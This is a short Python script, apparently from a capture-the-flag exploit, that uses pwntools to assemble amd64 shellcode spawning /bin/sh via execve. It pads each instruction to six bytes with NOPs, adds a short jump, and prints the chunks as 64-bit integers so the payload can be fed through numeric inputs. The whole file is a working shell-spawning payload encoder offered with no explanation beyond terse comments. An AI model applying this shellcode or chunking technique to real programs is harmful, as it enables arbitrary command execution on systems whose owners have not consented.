from pwn import *
context.arch='amd64'

shellcode = [
	"push 0x68", #2
	"mov eax, 0x732f2f2f", #5
	"shl rax, 32", #4 逻辑左移
	"add rax, 0x6e69622f", #6
	"push rax", #1
	"mov rdi, rsp", #3
	"push 0x6873", #5
	"xor esi, esi", #2
	"push rsi", #1
	"push 8", #2
	"pop rsi", #1
	"add rsi, rsp", #3
	"push rsi", #1
	"mov rsi, rsp", #3
	"xor edx, edx", #2
	"push SYS_execve", #2
	"pop rax", #1
	"syscall" #2
]

for code in shellcode:
	bytes = asm(code).ljust(6, b'\x90') + b'\xEB\xEB'	#\xEB\xEB jmp ptr-19
	print(u64(bytes))
